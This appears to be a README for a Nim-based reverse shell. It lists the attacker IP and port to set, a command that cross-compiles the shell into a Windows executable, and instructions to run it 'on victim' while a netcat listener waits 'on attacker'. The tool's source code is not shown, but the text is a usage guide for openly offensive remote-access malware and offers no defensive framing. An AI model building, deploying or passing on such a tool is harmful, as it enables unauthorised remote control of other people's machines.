# nim_reverse_shell

<br> ## A simple reverse shell with nim code.

<br> # How to build and run?

<br> ## Change this code snippet:
##var ip = "10.0.0.183"
##var port = 1337
<br> 

## Install Nim -> sudo apt install nim -y
<br> ## Build the reverse shell -> nim c --d:mingw --cpu=amd64 reverse.nim
<br> ## On victim: ./reverse.exe
<br> ## On Attacker: nc -vnlp 1337
